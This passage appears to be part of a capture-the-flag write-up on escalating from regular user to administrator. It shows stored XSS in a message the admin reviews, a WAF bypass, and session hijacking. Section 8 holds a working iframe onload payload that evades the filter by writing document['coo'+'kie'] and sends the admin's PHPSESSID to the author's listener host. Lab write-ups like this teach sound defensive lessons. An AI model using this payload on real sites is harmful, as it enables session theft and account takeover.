6. From User to Administrator

After obtaining regular-user access, I inspected the functionality available on the dashboard.
One feature allowed me to submit a message that would later be reviewed by the administrator.
This immediately suggested a possible Stored XSS attack.

The important detail was that the submitted content was subsequently rendered in an administrator context.
If JavaScript could execute there, it might be possible to access the administrator's session.

---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   

7. Testing for XSS

I first tried a standard payload:
 <script>alert(1)</script>

The payload was blocked by the WAF.
Instead of immediately trying random payloads, I started identifying which parts of the HTML/JavaScript syntax were being filtered.

One useful test was an external resource request:
 <img src="http://10.113.129.14:8000">

I started a simple HTTP server:
 python3 -m http.server 8000

When the administrator viewed the submitted content, the server received an incoming request.
That confirmed that the HTML was being rendered by the administrator's browser and that external resources could be loaded.
This was a strong indication that the filtering could potentially be bypassed to achieve JavaScript execution.

---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   

8. WAF Behavior

Further testing revealed several useful restrictions:
 `<script>` elements were filtered.
 Direct use of `cookie` was blocked.
 Some event handlers behaved differently depending on the HTML element being used.

The goal was therefore to execute JavaScript without using the obvious signatures that the WAF was looking for.

I used an alternative HTML element with an event handler:
 <iframe onload="new Image().src='http://10.113.129.14:8000/?x='+document['coo'+'kie']"></iframe>

The interesting part is:
 document['coo'+'kie']

Instead of writing:
 document.cookie

the property name is constructed dynamically.

At runtime, JavaScript evaluates:
 'coo' + 'kie'
as:
 cookie

This allowed the browser to access the cookie while avoiding a simple WAF signature looking specifically for the literal string document.cookie.

I then started another listener:
 python3 -m http.server 8000

After the administrator processed the message, an HTTP request arrived at my server containing the administrator's session information.
The captured value corresponded to the administrator's PHPSESSID.

---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   

9. Session Hijacking

The application used the PHP session identifier to maintain authentication.
Since the initial Nmap scan had already indicated that the PHPSESSID cookie did not have the HttpOnly attribute, client-side JavaScript could access it.
I opened the browser's developer tools and navigated to the site's stored cookies.
The current session contained a PHPSESSID belonging to my regular user account.
I replaced that value with the session identifier obtained from the administrator's browser.
After refreshing the page, the application treated my browser as the administrator's session.

I then requested:
 http://10.113.129.14/admin.php

The administrator panel was now accessible without knowing the administrator's password.
The second flag was available inside the admin interface.
